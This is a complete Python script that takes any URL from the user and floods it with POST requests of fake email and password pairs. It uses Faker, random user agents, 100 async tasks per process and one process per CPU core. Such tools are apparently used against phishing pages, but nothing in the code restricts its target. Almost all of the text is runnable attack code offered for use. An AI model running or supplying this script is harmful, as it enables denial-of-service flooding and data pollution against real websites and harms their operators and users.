from faker import Faker
from aiohttp import ClientSession, ClientResponseError
from multiprocessing import Process, cpu_count
from typing import Any
import uvloop
import asyncio
import random
import string
import sys
import logging


URL = input('Enter the URL you would like to flood: ')
NUM_TASKS = 100
NUM_REQUESTS_PER_TASK = 100
IS_PYTHON_3_11_OR_LATER = sys.version_info >= (3, 11)

if not IS_PYTHON_3_11_OR_LATER:
    uvloop.install()


logging.basicConfig(
    format='[%(levelname)s] %(message)s',
    level=logging.INFO
)


fake = Faker()


def generate_fake_data() -> dict[str, Any]:
    """Generate fake data for the URL."""
    first_name = fake.first_name().lower()
    last_name = fake.last_name().lower()
    # Randomize the length as well as the digits instead of using random int
    extra_digits = ''.join(random.choices(string.digits, k=random.randint(1, 5)))
    email_domain = fake.free_email_domain()

    email = first_name + last_name + extra_digits + '@' + email_domain
    password = fake.password(length=random.randint(8, 20))
    return {'e': email, 'p': password}


async def send_fake_data(session: ClientSession) -> None:
    """Send many post requests to the URL."""
    for _ in range(NUM_REQUESTS_PER_TASK):
        data = generate_fake_data()
        headers = {'User-Agent': fake.user_agent()}

        try:
            response = await session.post(URL, data=data, headers=headers)
            response.raise_for_status()
        except ClientResponseError as e:
            status = e.status
            logging.warning(f'{status}: {e.message}')

            if status >= 500:
                return
        except Exception as e:
            logging.error(str(e))
            return
        else:
            logging.info(f'{response.status}: {data}')


async def attack_url_async() -> None:
    """Create and execute many tasks for the event loop."""
    async with ClientSession() as session:
        tasks = [asyncio.create_task(send_fake_data(session)) for _ in range(NUM_TASKS)]
        await asyncio.gather(*tasks)


def attack_url() -> None:
    """Send many post requests to the URL using asyncio."""
    if IS_PYTHON_3_11_OR_LATER:
        with asyncio.Runner(loop_factory=uvloop.new_event_loop) as runner:
            runner.run(attack_url_async())
    else:
        asyncio.run(attack_url_async())


def main() -> None:
    """Use multiple CPU cores to flood the URL, each with its own async event loop."""
    processes = [Process(target=attack_url, daemon=True) for _ in range(cpu_count())]

    for process in processes:
        process.start()

    for process in processes:
        process.join()


if __name__ == '__main__':
    main()
